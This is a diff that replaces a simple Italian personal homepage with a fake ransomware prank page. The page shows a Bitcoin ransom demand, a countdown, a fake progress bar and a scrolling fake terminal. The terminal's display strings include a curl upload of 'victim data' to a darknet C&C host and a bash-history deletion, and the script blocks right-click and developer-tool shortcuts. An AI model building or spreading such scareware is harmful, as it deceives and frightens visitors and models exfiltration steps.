@@ -3,107 +3,598 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>La Mia Pagina</title>
+    <title>SYSTEM COMPROMISED</title>
     <style>
+        @import url('https://fonts.googleapis.com/css2?family=Courier+Prime:wght@400;700&family=Share+Tech+Mono&display=swap');
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            max-width: 800px;
+            background: #000000;
+            font-family: 'Share Tech Mono', 'Courier Prime', monospace;
+            color: #00ff00;
+            overflow: hidden;
+            height: 100vh;
+            position: relative;
+        }
+
+        .matrix-bg {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0.3;
+        }
+
+        .matrix-char {
+            position: absolute;
+            color: #00ff00;
+            font-family: 'Share Tech Mono', monospace;
+            font-size: 18px;
+            font-weight: bold;
+            animation: matrix-fall linear infinite;
+            text-shadow: 0 0 5px #00ff00;
+        }
+
+        @keyframes matrix-fall {
+            to { transform: translateY(100vh); opacity: 0; }
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            height: 100vh;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: auto 1fr auto auto;
+            gap: 15px;
+            padding: 15px;
+            max-width: 1400px;
             margin: 0 auto;
-            padding: 20px;
-            line-height: 1.6;
-            color: #333;
         }
-        
-        header {
+
+        .skull-art {
+            grid-column: 1 / -1;
+            font-family: monospace;
+            font-size: 0.6rem;
+            color: #00ff00;
+            text-shadow: 0 0 10px #00ff00;
+            line-height: 1;
+            white-space: pre;
             text-align: center;
-            border-bottom: 2px solid #ddd;
-            padding-bottom: 20px;
-            margin-bottom: 30px;
-        }
-        
-        h1 {
-            color: #2c3e50;
             margin-bottom: 10px;
         }
-        
-        .subtitle {
-            color: #666;
-            font-style: italic;
-        }
-        
-        section {
-            margin-bottom: 30px;
-        }
-        
-        h2 {
-            color: #34495e;
-            border-left: 4px solid #3498db;
-            padding-left: 15px;
-        }
-        
-        .card {
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 8px;
-            margin: 15px 0;
-        }
-        
-        footer {
+
+        .hacker-title {
+            grid-column: 1 / -1;
+            font-size: 1.3rem;
+            font-weight: 700;
+            color: #00ff00;
+            text-shadow: 0 0 20px #00ff00;
+            letter-spacing: 2px;
             text-align: center;
-            border-top: 1px solid #ddd;
-            padding-top: 20px;
-            margin-top: 40px;
-            color: #666;
-            font-size: 0.9em;
+            margin-bottom: 15px;
         }
-        
-        a {
-            color: #3498db;
-            text-decoration: none;
+
+        .terminal {
+            background: rgba(0, 20, 0, 0.9);
+            border: 2px solid #00ff00;
+            border-radius: 8px;
+            position: relative;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+            overflow: hidden;
+            display: flex;
+            flex-direction: column;
         }
-        
-        a:hover {
-            text-decoration: underline;
+
+        .terminal-header {
+            background: rgba(0, 255, 0, 0.1);
+            border-bottom: 1px solid #00ff00;
+            padding: 8px 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            flex-shrink: 0;
+        }
+
+        .terminal-dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #00ff00;
+            box-shadow: 0 0 5px #00ff00;
+        }
+
+        .terminal-title {
+            color: #00ff00;
+            font-size: 0.8rem;
+            font-weight: bold;
+        }
+
+        .terminal-content {
+            padding: 12px;
+            flex: 1;
+            overflow-y: auto;
+            font-size: 0.75rem;
+            line-height: 1.3;
+        }
+
+        .terminal-line {
+            margin-bottom: 4px;
+            opacity: 0;
+            animation: typewriter 0.3s forwards;
+        }
+
+        .terminal-line.success {
+            color: #00ff00;
+        }
+
+        .terminal-line.warning {
+            color: #ffff00;
+        }
+
+        .terminal-line.error {
+            color: #ff6666;
+        }
+
+        .terminal-line.info {
+            color: #00ffff;
+        }
+
+        @keyframes typewriter {
+            from { opacity: 0; transform: translateX(-10px); }
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        .ransom-panel {
+            background: rgba(0, 20, 0, 0.9);
+            border: 2px solid #ff0000;
+            border-radius: 8px;
+            padding: 15px;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.3);
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+        }
+
+        .ransom-title {
+            color: #ff0000;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-align: center;
+            text-shadow: 0 0 10px #ff0000;
+            margin-bottom: 10px;
+        }
+
+        .ransom-text {
+            color: #ffffff;
+            font-size: 0.8rem;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        .timer {
+            background: rgba(255, 0, 0, 0.1);
+            border: 1px solid #ff0000;
+            border-radius: 4px;
+            padding: 10px;
+            text-align: center;
+            color: #ff0000;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-shadow: 0 0 10px #ff0000;
+        }
+
+        .payment-section {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            align-items: center;
+        }
+
+        .payment-question {
+            color: #ffff00;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+
+        .payment-buttons {
+            display: flex;
+            gap: 15px;
+        }
+
+        .payment-btn {
+            padding: 8px 16px;
+            border: 2px solid;
+            border-radius: 4px;
+            background: transparent;
+            font-family: inherit;
+            font-size: 0.8rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+        }
+
+        .payment-btn.yes {
+            border-color: #00ff00;
+            color: #00ff00;
+        }
+
+        .payment-btn.yes:hover {
+            background: rgba(0, 255, 0, 0.2);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .payment-btn.no {
+            border-color: #ff0000;
+            color: #ff0000;
+        }
+
+        .payment-btn.no:hover {
+            background: rgba(255, 0, 0, 0.2);
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.5);
+        }
+
+        .progress-container {
+            grid-column: 1 / -1;
+            margin: 10px 0;
+        }
+
+        .progress-label {
+            color: #00ff00;
+            font-size: 0.8rem;
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 18px;
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00ff00;
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #004400, #00ff00);
+            width: 20%;
+            transition: width 0.3s ease;
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.5);
+        }
+
+        .progress-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #ffffff;
+            font-size: 0.7rem;
+            font-weight: bold;
+            text-shadow: 1px 1px 2px #000;
+        }
+
+        .system-info {
+            grid-column: 1 / -1;
+            display: flex;
+            justify-content: space-between;
+            color: #00ff00;
+            font-size: 0.65rem;
+            opacity: 0.7;
+        }
+
+        .cursor-blink {
+            animation: blink 1s infinite;
+        }
+
+        @keyframes blink {
+            0%, 50% { opacity: 1; }
+            51%, 100% { opacity: 0; }
+        }
+
+        .popup {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+        }
+
+        .popup-content {
+            background: rgba(0, 20, 0, 0.95);
+            border: 3px solid #00ff00;
+            border-radius: 10px;
+            padding: 30px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 0 50px rgba(0, 255, 0, 0.5);
+        }
+
+        .popup-title {
+            color: #00ff00;
+            font-size: 1.5rem;
+            font-weight: bold;
+            margin-bottom: 20px;
+            text-shadow: 0 0 15px #00ff00;
+        }
+
+        .popup-text {
+            color: #ffffff;
+            font-size: 1rem;
+            line-height: 1.5;
+        }
+
+        @media (max-width: 1200px) {
+            .container {
+                grid-template-columns: 1fr;
+                grid-template-rows: auto auto 1fr auto auto auto;
+            }
+            .skull-art { font-size: 0.5rem; }
+            .hacker-title { font-size: 1.1rem; }
+        }
+
+        @media (max-width: 768px) {
+            .container { padding: 10px; gap: 10px; }
+            .skull-art { font-size: 0.4rem; }
+            .hacker-title { font-size: 1rem; }
+            .terminal-content { font-size: 0.7rem; }
+            .ransom-text { font-size: 0.75rem; }
         }
     </style>
 </head>
 <body>
-    <header>
-        <h1>Benvenuto sul mio sito</h1>
-        <p class="subtitle">Una pagina semplice e pulita</p>
-    </header>
+    <div class="matrix-bg" id="matrix"></div>
 
-    <main>
-        <section>
-            <h2>Chi sono</h2>
-            <div class="card">
-                <p>Ciao! Questa è la mia pagina web personale. Qui puoi trovare informazioni su di me e sui miei progetti.</p>
-            </div>
-        </section>
+    <div class="container">
+        <div class="skull-art">⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠈⠉⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⢀⣠⣤⣤⣤⣤⣄⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠾⣿⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⣤⣶⣤⣉⣿⣿⡯⣀⣴⣿⡗⠀⠀⠀⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⡈⠀⠀⠉⣿⣿⣶⡉⠀⠀⣀⡀⠀⠀⠀⢻⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⡇⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⢸⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠉⢉⣽⣿⠿⣿⡿⢻⣯⡍⢁⠄⠀⠀⠀⣸⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠐⡀⢉⠉⠀⠠⠀⢉⣉⠀⡜⠀⠀⠀⠀⣿⣿⣿⣿⣿
+⣿⣿⣿⣿⣿⣿⠿⠁⠀⠀⠀⠘⣤⣭⣟⠛⠛⣉⣁⡜⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿
+⡿⠟⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⡀⠀⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀</div>
 
-        <section>
-            <h2>I miei progetti</h2>
-            <div class="card">
-                <h3>Progetto 1</h3>
-                <p>Descrizione del primo progetto interessante che ho realizzato.</p>
-            </div>
-            <div class="card">
-                <h3>Progetto 2</h3>
-                <p>Descrizione del secondo progetto su cui sto lavorando.</p>
-            </div>
-        </section>
+        <div class="hacker-title">🔒 SYSTEM ENCRYPTED BY STAY ACCORT 🔒</div>
 
-        <section>
-            <h2>Contatti</h2>
-            <div class="card">
-                <p>Puoi contattarmi via email: <a href="mailto:tuoemail@esempio.com">tuoemail@esempio.com</a></p>
-                <p>Oppure seguimi sui social media per rimanere aggiornato!</p>
+        <div class="terminal">
+            <div class="terminal-header">
+                <div class="terminal-dot"></div>
+                <div class="terminal-dot"></div>
+                <div class="terminal-dot"></div>
+                <div class="terminal-title">root@target-system:~#</div>
             </div>
-        </section>
-    </main>
+            <div class="terminal-content" id="terminal-content">
+                <!-- Terminal output will be generated here -->
+            </div>
+        </div>
 
-    <footer>
-        <p>&copy; 2025 - Il mio sito web. Tutti i diritti riservati.</p>
-    </footer>
+        <div class="ransom-panel">
+            <div class="ransom-title">⚠️ I TUOI FILE SONO STATI CRIPTATI ⚠️</div>
+            <div class="ransom-text">
+                Siamo entrati sul tuo computer e stiamo criptando tutti i tuoi dati personali!<br><br>
+                📁 Documenti, foto, video e backup<br>
+                💰 Portafogli crypto e password<br>
+                🏦 Informazioni bancarie<br><br>
+                Se vuoi fermare questa operazione e recuperare i tuoi file, devi pagare il riscatto!
+            </div>
+            
+            <div class="timer" id="timer">
+                Tempo rimanente: 29:59
+            </div>
+
+            <div class="payment-section">
+                <div class="payment-question">Accetti di pagare 0.5 BTC per recuperare i tuoi file?</div>
+                <div class="payment-buttons">
+                    <button class="payment-btn yes" onclick="showPopup()">SÌ, PAGO</button>
+                    <button class="payment-btn no" onclick="showPopup()">NO, RIFIUTO</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="progress-container">
+            <div class="progress-label">🔐 Crittografia File in Corso...</div>
+            <div class="progress-bar">
+                <div class="progress-fill" id="progress-fill"></div>
+                <div class="progress-text" id="progress-text">20%</div>
+            </div>
+        </div>
+
+        <div class="system-info">
+            <div>TARGET: 192.168.1.1</div>
+            <div>STATUS: ENCRYPTING</div>
+            <div>LOCATION: 40.9167°N 14.2167°E</div>
+            <div>WALLET: bc1q...a7x9k2p</div>
+        </div>
+    </div>
+
+    <div class="popup" id="popup">
+        <div class="popup-content">
+            <div class="popup-title">😄 GOTCHA!</div>
+            <div class="popup-text">
+                Bro è solo una prova, fermati!<br><br>
+                <strong>#STAYACCORT!</strong><br><br>
+                Nessun file è stato realmente criptato.<br>
+                Questo era solo un test di sicurezza.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Matrix rain effect
+        function createMatrixRain() {
+            const matrix = document.getElementById('matrix');
+            const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
+
+            for (let i = 0; i < 80; i++) {
+                const char = document.createElement('div');
+                char.className = 'matrix-char';
+                char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                char.style.left = Math.random() * 100 + '%';
+                char.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                char.style.animationDelay = Math.random() * 2 + 's';
+                matrix.appendChild(char);
+
+                // Replace character after animation
+                setTimeout(() => {
+                    char.textContent = chars[Math.floor(Math.random() * chars.length)];
+                }, (Math.random() * 3 + 2) * 1000);
+            }
+        }
+
+        // Terminal simulation with faster messages and loop
+        const terminalLines = [
+            { text: 'root@target-system:~# systemctl status firewall', type: 'success', delay: 200 },
+            { text: '● firewall.service - disabled', type: 'error', delay: 300 },
+            { text: 'root@target-system:~# find /home -type f -name "*.pdf" -o -name "*.doc*" -o -name "*.jpg"', type: 'success', delay: 400 },
+            { text: 'Scanning for valuable files...', type: 'warning', delay: 500 },
+            { text: '/home/user/Documents/contratto_lavoro.pdf', type: 'info', delay: 600 },
+            { text: '/home/user/Pictures/famiglia_vacanze.jpg', type: 'info', delay: 700 },
+            { text: '/home/user/Documents/dichiarazione_redditi.pdf', type: 'info', delay: 800 },
+            { text: '/home/user/Downloads/crypto_keys.txt', type: 'error', delay: 900 },
+            { text: 'root@target-system:~# openssl enc -aes-256-cbc -salt', type: 'success', delay: 1000 },
+            { text: 'Encrypting files with AES-256...', type: 'warning', delay: 1100 },
+            { text: 'Progress: 20% complete', type: 'info', delay: 1200 },
+            { text: 'Progress: 35% complete', type: 'info', delay: 1300 },
+            { text: 'Progress: 47% complete', type: 'info', delay: 1400 },
+            { text: 'Progress: 63% complete', type: 'info', delay: 1500 },
+            { text: 'root@target-system:~# rm -f /home/user/.bash_history', type: 'success', delay: 1600 },
+            { text: 'Cleaning traces...', type: 'warning', delay: 1700 },
+            { text: 'root@target-system:~# curl -X POST https://darknet-server.onion/victim-data', type: 'success', delay: 1800 },
+            { text: 'Sending encrypted keys to C&C server...', type: 'error', delay: 1900 },
+            { text: 'Upload progress: 78%', type: 'info', delay: 2000 },
+            { text: 'Upload complete: victim registered', type: 'error', delay: 2100 },
+            { text: 'root@target-system:~# echo "STAY_ACCORT_WAS_HERE" > /home/user/Desktop/README.txt', type: 'success', delay: 2200 },
+            { text: 'Ransomware deployment: SUCCESS', type: 'error', delay: 2300 },
+            { text: '', type: 'info', delay: 2400 },
+        ];
+
+        let terminalIndex = 0;
+        function displayTerminalLine() {
+            if (terminalIndex >= terminalLines.length) {
+                terminalIndex = 0;
+                // Clear terminal after loop
+                setTimeout(() => {
+                    document.getElementById('terminal-content').innerHTML = '';
+                    displayTerminalLine();
+                }, 1000);
+                return;
+            }
+            
+            const line = terminalLines[terminalIndex];
+            const terminalContent = document.getElementById('terminal-content');
+            
+            setTimeout(() => {
+                const lineElement = document.createElement('div');
+                lineElement.className = `terminal-line ${line.type}`;
+                lineElement.innerHTML = line.text;
+                terminalContent.appendChild(lineElement);
+                terminalContent.scrollTop = terminalContent.scrollHeight;
+                
+                terminalIndex++;
+                displayTerminalLine();
+            }, line.delay);
+        }
+
+        // Timer countdown (30 minutes)
+        function startTimer() {
+            let timeLeft = 30 * 60; // 30 minutes in seconds
+            const timerElement = document.getElementById('timer');
+            
+            const timerInterval = setInterval(() => {
+                const minutes = Math.floor(timeLeft / 60);
+                const seconds = timeLeft % 60;
+                timerElement.textContent = `Tempo rimanente: ${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+                
+                timeLeft--;
+                if (timeLeft < 0) {
+                    clearInterval(timerInterval);
+                    timerElement.textContent = "TEMPO SCADUTO!";
+                    timerElement.style.color = '#ff0000';
+                    timerElement.style.animation = 'blink 0.5s infinite';
+                }
+            }, 1000);
+        }
+
+        // Progress bar starting from 20%
+        function updateProgress() {
+            const progressFill = document.getElementById('progress-fill');
+            const progressText = document.getElementById('progress-text');
+            let progress = 20; // Start from 20%
+            const maxProgress = 95; // Don't go to 100%
+            const duration = 120000; // 2 minutes to reach 95%
+            const interval = 200;
+            const increment = (maxProgress - 20) / (duration / interval);
+
+            const progressInterval = setInterval(() => {
+                progress += increment;
+                if (progress >= maxProgress) {
+                    progress = maxProgress;
+                    clearInterval(progressInterval);
+                    progressText.textContent = Math.floor(progress) + '% - ATTESA PAGAMENTO';
+                } else {
+                    progressText.textContent = Math.floor(progress) + '%';
+                }
+                progressFill.style.width = progress + '%';
+            }, interval);
+        }
+
+        // Show popup function
+        function showPopup() {
+            document.getElementById('popup').style.display = 'flex';
+            
+            // Auto-close popup after 5 seconds
+            setTimeout(() => {
+                document.getElementById('popup').style.display = 'none';
+            }, 5000);
+        }
+
+        // Initialize everything
+        createMatrixRain();
+        displayTerminalLine();
+        startTimer();
+        updateProgress();
+
+        // Refresh matrix rain every 10 seconds
+        setInterval(() => {
+            document.getElementById('matrix').innerHTML = '';
+            createMatrixRain();
+        }, 10000);
+
+        // Prevent context menu and certain shortcuts
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || 
+                (e.ctrlKey && (e.key === 'u' || e.key === 'U' || e.shiftKey && e.key === 'I'))) {
+                e.preventDefault();
+            }
+        });
+
+        // Click outside popup to close
+        document.getElementById('popup').addEventListener('click', (e) => {
+            if (e.target.id === 'popup') {
+                document.getElementById('popup').style.display = 'none';
+            }
+        });
+    </script>
 </body>
 </html>
